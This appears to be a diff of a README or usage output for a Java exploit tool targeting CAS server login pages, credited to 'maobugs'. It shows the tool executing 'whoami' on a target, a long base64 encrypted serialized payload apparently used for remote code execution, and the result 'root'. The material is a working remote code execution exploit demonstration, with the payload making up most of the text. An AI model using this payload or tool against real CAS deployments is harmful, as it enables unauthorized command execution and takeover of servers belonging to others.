@@ -17,7 +17,9 @@ java -jar cas-0.0.1-all.jar  http://localhost:8080/cas-server/login
 *           *
 *           *
 ---------use: jar -jar cas-0.0.1-all.jar http://xxxx.xxxx-------
+
 -------------------create by maobugs----------------------------
+
 执行命令whoami...
 payload is: AAAAIgAAABBrUgLwoiwOSTCDnal67lrrAAAABmFlczEyOG2E5KGXIUeDS4otbEU6mQufQIcYPEwC
 AzL9uqiZr4dOaap91C0EktTooeh7aMerjfA+HcOoYp6+UkKC+fVP2HArdF0rM3ug7/8/EQqhNy3o
@@ -56,6 +58,7 @@ koHQNvbS8Yg6UOnp3XwBaSbqfQFaNbJMKAwsO6rqem0E2WzK1wSysVas9HAvNFxXTc17Q2g7asXc
 ikIIPcAvvBuwHE21QXJVjD5FpIr9TskYQRTGPY1A3Ivy8obdFqXfqMpYtIYoEIJnS5qmDbE+H2aD
 uT0fNHcMv6oiiet/oGE7MYg8lRV3f2q3LmrJY1m3skB/3yQkP+hoZSaVZfLrljwoaDzCacYEL3Un
 BcnkUX4PLBLWolJgD30=
-执行结果是：esg\wuxiong
+
+执行结果是：root
 
 
